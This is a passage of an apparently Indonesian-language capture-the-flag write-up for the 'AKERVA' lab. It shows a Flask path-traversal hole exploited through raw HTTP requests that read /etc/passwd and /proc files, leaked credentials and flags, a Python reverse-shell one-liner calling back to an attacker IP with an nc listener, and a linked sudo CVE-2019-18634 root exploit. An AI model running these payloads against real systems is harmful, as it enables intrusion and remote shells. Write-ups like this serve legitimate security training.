 :: Wordlist         : FUZZ: /home/aexon/tools/wordlist/SecLists-master/Fuzzing/4-digits-0000-9999.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

0910                    [Status: 200, Size: 22071775, Words: 0, Lines: 0, Duration: 0ms]
[WARN] Caught keyboard interrupt (Ctrl-C)


```



##### space_dev.py
```python
#!/usr/bin/python

from flask import Flask, request
from flask_httpauth import HTTPBasicAuth
from werkzeug.security import generate_password_hash, check_password_hash

app = Flask(__name__)
auth = HTTPBasicAuth()

users = {
        "aas": generate_password_hash("AKERVA{1kn0w_H0w_TO_$Cr1p_T_$$$$$$$$}")
        }

@auth.verify_password
def verify_password(username, password):
    if username in users:
        return check_password_hash(users.get(username), password)
    return False

@app.route('/')
@auth.login_required
def hello_world():
    return 'Hello, World!'

# TODO
@app.route('/download')
@auth.login_required
def download():
    return downloaded_file

@app.route("/file")
@auth.login_required
def file():
	filename = request.args.get('filename')
	try:
		with open(filename, 'r') as f:
			return f.read()
	except:
		return 'error'

if __name__ == '__main__':
    print(app)
    print(getattr(app, '__name__', getattr(app.__class__, '__name__')))
    app.run(host='0.0.0.0', port='5000', debug = True)

```



##### wp-config.php
```php
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'wordpress' );

/** MySQL database password */
define( 'DB_PASSWORD', 'ZokDHE_DJ_____enzU)=' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );
```

#### Password username 5000

```
username: aas
password : AKERVA{1kn0w_H0w_TO_$Cr1p_T_$$$$$$$$}
```

```python
@app.route("/file")
@auth.login_required
def file():
	filename = request.args.get('filename')
	try:
		with open(filename, 'r') as f:
			return f.read()
	except:
		return 'error'


```

terdapat dir traversal

```json
GET /file?filename=/etc/passwd HTTP/1.1
Host: 10.13.37.11:5000
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
DNT: 1
Authorization: Basic YWFzOkFLRVJWQXsxa24wd19IMHdfVE9fJENyMXBfVF8kJCQkJCQkJH0=
Connection: close
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

```

```json
HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 1618
Server: Werkzeug/0.16.0 Python/2.7.15+
Date: Thu, 20 Jun 2024 09:39:34 GMT

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
aas:x:1000:1000:Lyderic Lefebvre:/home/aas:/bin/bash
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
Debian-snmp:x:111:113::/var/lib/snmp:/bin/false
mysql:x:109:115:MySQL Server,,,:/nonexistent:/bin/false

```



## Flag 5

```json
GET /file?filename=../../../../../../../../home/aas/flag.txt HTTP/1.1
Host: 10.13.37.11:5000
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
DNT: 1
Authorization: Basic YWFzOkFLRVJWQXsxa24wd19IMHdfVE9fJENyMXBfVF8kJCQkJCQkJH0=
Connection: close
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

```

```json
HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 21
Server: Werkzeug/0.16.0 Python/2.7.15+
Date: Thu, 20 Jun 2024 09:44:34 GMT

AKERVA{IKNOW#LFi_@_}

```



## Flag 6

oke, untuk flag ke 6 mengarah ke url 
```url
http://10.13.37.11:5000/download
```

**get_machine_id**
```text
d7c3467c434845a0a32a3ba8bd871701
```

**```
/sys/class/net/ens33/address**
```python
print(0x005056b0d271)
```

**Username**
```json
GET /file?filename=/proc/self/environ HTTP/1.1
Host: 10.13.37.11:5000
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
DNT: 1
Authorization: Basic YWFzOkFLRVJWQXsxa24wd19IMHdfVE9fJENyMXBfVF8kJCQkJCQkJH0=
Connection: close
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

```

```json
HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 223
Server: Werkzeug/0.16.0 Python/2.7.15+
Date: Thu, 20 Jun 2024 10:58:26 GMT

LANG=en_US.UTF-8 SHELL=/bin/sh SHLVL=1 WERKZEUG_RUN_MAIN=true PWD=/home/aas WERKZEUG_SERVER_FD=3 LOGNAME=aas HOME=/home/aas PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin _=/var/www/html/dev/space_dev.py 
```


```json
GET /file?filename=/proc/self/cgroup HTTP/1.1
Host: 10.13.37.11:5000
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
DNT: 1
Authorization: Basic YWFzOkFLRVJWQXsxa24wd19IMHdfVE9fJENyMXBfVF8kJCQkJCQkJH0=
Connection: close
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
```

```json
HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 263
Server: Werkzeug/0.16.0 Python/2.7.15+
Date: Thu, 20 Jun 2024 11:04:26 GMT

12:cpuset:/
11:memory:/
10:hugetlb:/
9:rdma:/
8:freezer:/
7:pids:/system.slice/cron.service
6:cpu,cpuacct:/
5:perf_event:/
4:devices:/system.slice/cron.service
3:net_cls,net_prio:/
2:blkio:/
1:name=systemd:/system.slice/cron.service
0::/system.slice/cron.service
```

**Reverse shell**

stelah itu running 
```bash
nc -lvnp port
```

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.4",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")
```

```bash
$ ls -al
ls -al
total 28
drwxr-xr-x 3 aas  aas  4096 Feb  9  2020 .
drwxr-xr-x 3 root root 4096 Feb  9  2020 ..
-rw------- 1 root root    0 Dec  7  2019 .bash_history
-rw-r--r-- 1 aas  aas   220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 aas  aas  3771 Apr  4  2018 .bashrc
-r-------- 1 aas  aas    21 Feb  9  2020 flag.txt
-rw-r--r-- 1 root root   38 Feb  9  2020 .hiddenflag.txt
dr-xr-x--- 2 aas  aas  4096 Feb 10  2020 .ssh
$ cat .hiddenflag.txt
cat .hiddenflag.txt
AKERVA{IkNOW#=ByPassWerkZeugPinC0de!}
$ 

```


# ROOT

```bash
$ sudo --version
Sudo version 1.8.21p2
Sudoers policy plugin version 1.8.21p2
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.21p2

```

[root exploit](https://github.com/saleemrashid/sudo-cve-2019-18634/)

AKERVA{IkNow_Sud0_sUckS!}

```bash
echo "R09BSEdIRUVHU0FFRUhBQ0VHVUxSRVBFRUVDRU9LTUtFUkZTRVNGUkxLRVJVS1RTVlBNU1NOSFNL
UkZGQUdJQVBWRVRDTk1ETFZGSERBT0dGTEFGR1NLRVVMTVZPT1dXQ0FIQ1JGVlZOVkhWQ01TWUVM
U1BNSUhITU9EQVVLSEUK" | base64 -d
```

output

```base64
GOAHGHEEGSAEEHACEGULREPEEECEOMKERFSESFRLKERUKTSVPMSSNHSKRFFAGIAPVETCNMDLVFHDAOGFLAFGSKEULMVOOWWCAHCRFVVNVHVCMSYELSPMIHHMODAUKHE
```

setelah itu membuat script untuk menghilangkan kata" untuk decode

```python
import string
def check(char):
	s = "GOAHGHEEGSAEEHACEGULREPEEECEOKMKERFSESFRLKERUKTSVPMSSNHSKRFFAGIAPVETCNMDLVFHDAOGFLAFGSKEULMVOOWWCAHCRFVVNVHVCMSYELSPMIHHMODAUKHE" 
	if(char.upper() in s):
		pass
	else:
		print(char.upper())

alphabets = "abcdefghijklmnopqrstuvwxyz"
for c in alphabets:
	check(c)

```


![[Screenshot at 2024-06-20 21-57-43.png]]
nanti alphabet nya jadi seperti ini ACDEFGHIKLMNOPRSTUVWY![[Screenshot at 2024-06-20 22-07-35.png]]

output decode

```text
WELLDONEFORSOLVINGTHISCHALLENGEYOUCANSENDYOURRESUMEHEREATRECRUTEMENTAKERVACOMANDVALIDATETHELASTFLAGWITHAKERVAIKNOOOWVIGEEENERRRE
```


flag: AKERVA{IKNOOOWVIGEEENERRRE}